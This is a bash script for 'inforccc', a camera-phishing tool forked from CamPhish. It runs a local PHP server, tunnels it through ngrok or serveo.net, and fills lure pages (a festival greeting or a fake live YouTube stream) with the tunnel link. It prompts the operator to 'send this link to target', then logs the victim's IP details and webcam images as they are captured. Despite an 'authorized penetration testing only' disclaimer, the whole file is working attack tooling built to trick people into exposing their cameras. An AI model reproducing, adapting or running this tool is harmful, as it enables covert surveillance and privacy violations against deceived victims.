#!/bin/bash
# inforccc v1.0
# Author: cyberwithmanveer
# Forked from CamPhish by baradatipu
# For authorized penetration testing only

trap 'printf "\n";stop' 2

banner() {
clear
printf "\e[1;92m  _______  _______  _______  \e[0m\e[1;77m_______          _________ _______          \e[0m\n"
printf "\e[1;92m (  ____ \(  ___  )(       )\e[0m\e[1;77m(  ____ )|\     /|\__   __/(  ____ \|\     /|\e[0m\n"
printf "\e[1;92m | (    \/| (   ) || () () |\e[0m\e[1;77m| (    )|| )   ( |   ) (   | (    \/| )   ( |\e[0m\n"
printf "\e[1;92m | |      | (___) || || || |\e[0m\e[1;77m| (____)|| (___) |   | |   | (_____ | (___) |\e[0m\n"
printf "\e[1;92m | |      |  ___  || |(_)| |\e[0m\e[1;77m|  _____)|  ___  |   | |   (_____  )|  ___  |\e[0m\n"
printf "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | |         ) || (   ) |\e[0m\n"
printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"
printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n"
printf "\n"
printf "\e[1;93m  _       _   _   ____   ____    ____    _____   ___  \e[0m\n"
printf "\e[1;93m (_)     (_) | \ | |  _ \ / ___|  / ___|  |_   _| / _ \ \e[0m\n"
printf "\e[1;93m  | |     | | |  \| | |_) | |     | |       | |  | | | |\e[0m\n"
printf "\e[1;93m  | |     | | | |\  |  _ <| |___  | |___    | |  | |_| |\e[0m\n"
printf "\e[1;93m  |_|     |_| |_| \_|_| \_\\\\____|  \____|   |_|   \___/ \e[0m\n"
printf "\n"
printf "\e[1;92m  +++  inforccc  -  Camera Intelligence Tool  +++\e[0m\n"
printf "\e[1;77m  Author : cyberwithmanveer\e[0m\n"
printf "\e[1;77m  GitHub : https://github.com/cyberwithmanveer/inforccc\e[0m\n"
printf "\e[1;77m  Version: 1.0 (Forked from CamPhish)\e[0m\n"
printf "\n"
}

stop() {
checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
pkill -f -2 ssh > /dev/null 2>&1
killall -2 ssh > /dev/null 2>&1
fi
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
if [[ -e index.html ]]; then
rm -rf index.html
fi
if [[ -e index.php ]]; then
rm -rf index.php
fi
if [[ -e index2.html ]]; then
rm -rf index2.html
fi
printf "\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] inforccc stopped. Processes cleaned.\n"
exit 1
}

dependencies() {
printf "\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Checking dependencies...\n"
command -v php > /dev/null 2>&1 || { echo >&2 "PHP is required but not installed."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "Curl is required but not installed."; exit 1; }
command -v ssh > /dev/null 2>&1 || { echo >&2 "SSH is required but not installed."; exit 1; }
command -v unzip > /dev/null 2>&1 || { echo >&2 "Unzip is required but not installed."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "Wget is required but not installed."; exit 1; }
}

select_template() {
default_option_tem="1"
printf "\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template:\n"
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Wishing\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live YouTube TV\e[0m\n"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Select template [Default is 1]: \e[0m' option_tem
option_tem="${option_tem:-${default_option_tem}}"
if [[ $option_tem -eq 1 ]]; then
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter festival name: \e[0m' fest_name
fest_name="${fest_name//[[:space:]]/}"
elif [[ $option_tem -eq 2 ]]; then
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
else
printf "\e[1;93m [!] Invalid template option! Try again\e[0m\n"
sleep 1
select_template
fi
}

payload_ngrok() {
link=$(grep -o "https://[0-9a-z]*\.ngrok.io" <<< "$link")
sed 's+forwarding_link+'$link'+g' template.php > index.php
if [[ $option_tem -eq 1 ]]; then
sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
elif [[ $option_tem -eq 2 ]]; then
sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
fi
rm -rf index3.html
}

checkfound() {
printf "\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Waiting for target...\n"
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Press Ctrl+C to exit\n"
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Send this link to target:\e[0m\e[1;77m %s\e[0m\n" $link

while [ true ]; do
if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Target opened the link!\n"
while IFS= read -r line; do
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] $line\n"
done < ip.txt
rm -rf ip.txt
fi

if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m\e[1;77m!\e[0m\e[1;92m] Camera access detected!\n"
while IFS= read -r line; do
printf "\e[1;92m[\e[0m\e[1;77m!\e[0m\e[1;92m] $line\n"
done < Log.log
rm -rf Log.log
fi

# Check for captured images
for cam_file in cam*.png; do
  if [ -f "$cam_file" ]; then
    printf "\n\e[1;92m[\e[0m\e[1;91m!\e[0m\e[1;92m] Camera image captured: $cam_file\n"
    mv "$cam_file" "$cam_file.captured" 2>/dev/null
  fi
  break
done

sleep 0.5
done
}

server() {
printf "\e[1;92m[\e[0m+\e[1;92m] Starting PHP server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting Serveo server...\n"
if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R $subdomain:80:127.0.0.1:3333 serveo.net > /dev/null 2>&1 &
sleep 8
else
ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:127.0.0.1:3333 serveo.net > /dev/null 2>&1 &
sleep 8
fi
}

payload() {
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
sed 's+forwarding_link+'$send_link'+g' template.php > index.php
if [[ $option_tem -eq 1 ]]; then
sed 's+forwarding_link+'$send_link'+g' festivalwishes.html > index3.html
sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
elif [[ $option_tem -eq 2 ]]; then
sed 's+forwarding_link+'$send_link'+g' LiveYTTV.html > index3.html
sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
fi
rm -rf index3.html
}

start() {
default_choose_sub="Y"
default_subdomain="inforccc$RANDOM"

printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
read choose_sub
choose_sub="${choose_sub:-${default_choose_sub}}"
if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
subdomain_resp=true
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
read subdomain
subdomain="${subdomain:-${default_subdomain}}"
fi

server
payload
checkfound
}

ngrok_server() {
if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "Unzip is required."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "Wget is required."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]]; then
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux: pkg install wget\e[0m\n"
exit 1
fi
else
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error...\e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting PHP server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting Ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link

payload_ngrok
checkfound
}

inforccc_main() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n----- Choose Tunnel Server -----\n"
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose Port Forwarding [Default: 1]: \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
select_template

if [[ $option_server -eq 2 ]]; then
command -v php > /dev/null 2>&1 || { echo >&2 "SSH is required."; exit 1; }
start
elif [[ $option_server -eq 1 ]]; then
ngrok_server
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
inforccc_main
fi
}

banner
dependencies
inforccc_main
